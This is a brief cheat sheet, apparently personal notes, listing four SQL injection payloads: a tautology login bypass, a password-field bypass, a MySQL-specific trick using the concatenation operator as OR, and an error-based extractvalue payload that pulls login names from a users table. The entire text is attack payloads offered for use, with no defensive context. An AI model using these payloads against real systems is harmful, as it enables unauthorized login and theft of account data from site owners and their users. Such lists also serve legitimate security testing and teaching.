------- Most usefull SQL injections --------
' OR 1=1 #
'=' (for password)
'||'(int) <= works onlywith mysql because perform it like or operator
' AND extractvalue(1,concat(0x3a,(select login from users limit 0,1)))
